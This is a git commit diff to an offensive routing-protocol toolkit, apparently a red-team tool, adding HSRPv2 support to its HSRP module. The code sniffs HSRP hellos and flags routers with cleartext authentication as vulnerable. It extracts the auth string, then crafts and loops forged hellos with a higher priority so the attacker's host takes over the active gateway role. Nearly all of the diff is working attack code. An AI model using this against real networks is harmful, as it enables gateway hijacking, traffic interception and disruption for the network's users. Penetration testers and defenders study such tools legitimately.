d99945f58cdd7a724e61bd3e9f9a8f3ce003d7b9
szymon <szymon@sensepost.com>
2020-08-27 09:31:56 +0200

    Added support for HSRPv2. Fixed a small bug in our logic(Can attack if priority is max, but need a higher IP address.

--- routopsy-toolkit/protocols/hsrp.py
+++ routopsy-toolkit/protocols/hsrp.py
@@ -13,28 +13,70 @@ import sys
 sys.path.append("..")
 import utility 
 import protocol_parser
+import ipaddress
 from protocols.hsrp_packet import HSRP_PACKET
 
 
 def detect_if_vulnerable(packet):
     if (packet.haslayer('HSRP')):
-        if (packet.haslayer('HSRP MD5 Authentication')):
-            # MD5 authentication detected, at current moment nothing we can do about attacking this.
-            pass
+        _, source_ip, _, destination_ip = protocol_parser.get_data_from_layer_two_and_three(packet)
+
+        # HSRPv2 multicasts to a different IP
+        if (destination_ip == '224.0.0.102'):
+            bytes_packet = bytes_hex(packet[3])
+
+            state = int(bytes_packet[4*2:(4*2)+1*2])
+            priority = int(bytes_packet[14*2:(14*2)+4*2],16)
+            group_state_length = int(bytes_packet[1*2:(1*2)+1*2],16)
+            auth_type = int(bytes_packet[(group_state_length+2)*2:((group_state_length+2)*2)+1*2],16)
+
+            # Auth type 3 means that its in the clear.
+            if (auth_type == 3):
+                if (state == 6):
+                    if (priority < 255):
+                        return True
+                    elif (ipaddress.IPv4Address(utility.get_ip_address_from_interface(user_var.interface)) > ipaddress.IPv4Address(source_ip)):
+                        return True
+                    else:
+                        return False 
+
+        # HSRPv1                   
         else:
-            # A state with 16 means they are the master/active
-            if(packet['HSRP'].state == 16):
-                if(packet['HSRP'].priority < 254):
-                    #Detected a vulnerable condition, HSRP packets have a priority of less than 254, authentication is cleartext
-                    return True
-            else:
-                # recieved a packet belonging to standby router, we can ignore.
-                # FIXME look at improving the filter to only get active packets
+            if (packet.haslayer('HSRP MD5 Authentication')):
+                # MD5 authentication detected, at current moment nothing we can do about attacking this.
                 pass
+            else:
+                # A state with 16 means they are the master/active
+                if(packet['HSRP'].state == 16):
+                    if(packet['HSRP'].priority < 255):
+                        #Detected a vulnerable condition, HSRP packets have a priority of less than 254, authentication is cleartext.
+                        #Actually, if you find the priority to be 254/max, there is still a chance to attack this. You will need to obtain a high IP address.
+                        #Refer to priority definition within https://tools.ietf.org/html/rfc2281#section-5.7.
+                        return True
+
+                        #Check if our IP address is higher, then we still have a chance if max priority is used.
+                    elif (ipaddress.IPv4Address(utility.get_ip_address_from_interface(user_var.interface)) > ipaddress.IPv4Address(source_ip)):
+                        return True
+                    else:
+                        return False
+                else:
+                    # recieved a packet belonging to standby router, we can ignore.
+                    # FIXME look at improving the filter to only get active packets
+                    pass
     else:
         return False
 
 def get_packet_data(packet):
+    _, source_ip, _, destination_ip = protocol_parser.get_data_from_layer_two_and_three(packet)
+
+    # HSRPv2 multicasts to a different IP
+    if (destination_ip == '224.0.0.102'):
+        return get_packet_data_v2(packet)
+    else:
+        return get_packet_data_v1(packet)
+
+
+def get_packet_data_v1(packet):
     source_mac, source_ip, destination_mac, destination_ip = protocol_parser.get_data_from_layer_two_and_three(packet)
 
     state = packet['HSRP'].state
@@ -47,7 +89,37 @@ def get_packet_data(packet):
     authentication = packet['HSRP'].auth.decode().rstrip('\x00')
     virtual_ip = packet['HSRP'].virtualIP
 
-    return source_mac, source_ip, destination_mac, destination_ip, state, hello_interval, dead_internal, priority, group, authentication, virtual_ip
+    return source_mac, source_ip, destination_mac, destination_ip, 1, state, hello_interval, dead_internal, priority, group, authentication, None, virtual_ip
+
+def get_packet_data_v2(packet):
+    source_mac, source_ip, destination_mac, destination_ip = protocol_parser.get_data_from_layer_two_and_three(packet)
+
+    #based off http://www.smartnetworks.jp/2006/02/hsrp_8_hsrp_version_2.html found through https://samate.nist.gov/SRD/testcases/SATE/wireshark-1.8.0/epan/dissectors/packet-hsrp.c
+
+    bytes_packet = bytes_hex(packet[3])
+
+    group_state_length = int(bytes_packet[1*2:(1*2)+1*2],16)
+
+    version = int(bytes_packet[2*2:(2*2)+1*2])
+    state = int(bytes_packet[4*2:(4*2)+1*2])
+    group = int(bytes_packet[6*2:(6*2)+2*2],16)
+    identifier = str(bytes_packet[8*2:(8*2)+6*2], 'utf-8')
+    priority = int(bytes_packet[14*2:(14*2)+4*2],16)
+    hello_interval = int(bytes_packet[18*2:(18*2)+4*2],16)
+    dead_interval = int(bytes_packet[22*2:(22*2)+4*2],16)
+    virtual_ip = socket.inet_ntoa(struct.pack(">L", int(bytes_packet[26*2:(26*2)+4*2], 16)))
+
+    auth_type = int(bytes_packet[(group_state_length+2)*2:((group_state_length+2)*2)+1*2],16)
+    auth_length = None
+    auth_data = None
+
+    if auth_type == 3:
+        auth_length = int(bytes_packet[(group_state_length+3)*2:((group_state_length+3)*2)+1*2],16)
+        auth_data = bytes_packet[(group_state_length+4)*2:((group_state_length+4)*2)+auth_length*2]
+        auth_data = bytearray.fromhex(auth_data.decode('UTF-8')).decode()
+        auth_data = auth_data.rstrip('\x00')
+
+    return source_mac, source_ip, destination_mac, destination_ip, 2, state, hello_interval, dead_interval, priority, group, auth_data, identifier, virtual_ip
 
 def check_if_same(packet1, packet2):
     if packet1.source_ip == packet2.source_ip and packet1.group == packet2.group and packet1.authentication == packet2.authentication:
@@ -73,19 +145,60 @@ def hsrp_scan_start(packet):
 
     detect_network_protocol(packet)
 
-def send_hsrp_packet(hsrp_packet,count):
+def payload_hsrp_packet_v1(hsrp_packet):
     payload_packet = Ether(dst=hsrp_packet.destination_mac)
     payload_packet = payload_packet / IP(src=utility.get_ip_address_from_interface(user_var.interface), dst=hsrp_packet.destination_ip, ttl=1)
     payload_packet = payload_packet / UDP(sport=1985, dport=1985)
-    payload_packet = payload_packet / HSRP(hellotime=hsrp_packet.hello_interval, holdtime=hsrp_packet.dead_interval, priority=hsrp_packet.priority + 1, group=hsrp_packet.group, virtualIP=hsrp_packet.virtual_ip, auth=hsrp_packet.authentication)
+
+    priority = hsrp_packet.priority
+
+    if (hsrp_packet.priority == 255):
+        pass
+    else:
+        priority = priority + 1
+
+    payload_packet = payload_packet / HSRP(hellotime=hsrp_packet.hello_interval, holdtime=hsrp_packet.dead_interval, priority=priority, group=hsrp_packet.group, virtualIP=hsrp_packet.virtual_ip, auth=hsrp_packet.authentication)
+    
+    return payload_packet
+
+def payload_hsrp_packet_v2(hsrp_packet):
+    payload_packet = Ether(dst=hsrp_packet.destination_mac)
+    payload_packet = payload_packet / IP(src=utility.get_ip_address_from_interface(user_var.interface), dst=hsrp_packet.destination_ip, ttl=1)
+    payload_packet = payload_packet / UDP(sport=1985, dport=1985)
+
+    priority = hsrp_packet.priority
+
+    if (hsrp_packet.priority == 255):
+        pass
+    else:
+        priority = priority + 1
+
+    #Padded with 12 null bytes for IPv4.
+    payload_packet = payload_packet / (struct.pack('B', 1)+struct.pack('B', 40)+struct.pack('B', hsrp_packet.version)+struct.pack('B', 0)+struct.pack('B', hsrp_packet.state)+struct.pack('B', 4)+struct.pack('>H', hsrp_packet.group)+bytearray.fromhex(hsrp_packet.identifier)+struct.pack('>I', priority)+struct.pack('>I', hsrp_packet.hello_interval)+struct.pack('>I', hsrp_packet.dead_interval)+struct.pack('>L', int(ipaddress.IPv4Address(hsrp_packet.virtual_ip)))+(struct.pack('B', 0)*12)+struct.pack('B', 3)+struct.pack('B', 8)+bytearray.fromhex(hsrp_packet.authentication.encode("utf-8").hex())+(struct.pack('B', 0)*(8-len(hsrp_packet.authentication))))
+    
+    return payload_packet
+
+def send_hsrp_packet(hsrp_packet,count):
+    payload_packet = None
+    if (hsrp_packet.version == 1):
+        payload_packet = payload_hsrp_packet_v1(hsrp_packet)
+    else:
+        payload_packet = payload_hsrp_packet_v2(hsrp_packet)
 
     prepare_environment(hsrp_packet)
 
+    interval = 0
+
+    if (hsrp_packet.hello_interval > 1000):
+        interval = hsrp_packet.hello_interval / 1000
+    else:
+        interval = hsrp_packet.hello_interval
+
     # look into why it won't immediately stop.
     if (count == 1):
-        sendp(payload_packet, iface=user_var.interface, loop=1, verbose=0, inter=hsrp_packet.hello_interval)
+        sendp(payload_packet, iface=user_var.interface, loop=1, verbose=0, inter=interval)
     else:
-        sendp(payload_packet, iface=user_var.interface, count=count, verbose=0, inter=hsrp_packet.hello_interval)
+        sendp(payload_packet, iface=user_var.interface, count=count, verbose=0, inter=interval)
     
     clean_up()
 
--- routopsy-toolkit/protocols/hsrp_packet.py
+++ routopsy-toolkit/protocols/hsrp_packet.py
@@ -4,25 +4,29 @@ class HSRP_PACKET:
         self.source_ip = None 
         self.destination_mac = None
         self.destination_ip = None
+        self.version = None
         self.state = None
         self.hello_interval = None
         self.dead_interval = None
         self.priority = None
         self.group = None
         self.authentication = None
+        self.identifier = None
         self.virtual_ip = None
         self.vulnerbale = None
 
-    def set_data(self, source_mac, source_ip, destination_mac, destination_ip, state, hello_interval, dead_interval, priority, group, authentication, virtual_ip, vulnerbale):
+    def set_data(self, source_mac, source_ip, destination_mac, destination_ip, version, state, hello_interval, dead_interval, priority, group, authentication, identifier, virtual_ip, vulnerbale):
         self.source_mac = source_mac
         self.source_ip = source_ip 
         self.destination_mac = destination_mac
         self.destination_ip = destination_ip
+        self.version = version
         self.state = state
         self.hello_interval = hello_interval
         self.dead_interval = dead_interval
         self.priority = priority
         self.group = group
         self.authentication = authentication
+        self.identifier = identifier
         self.virtual_ip = virtual_ip
         self.vulnerbale = vulnerbale
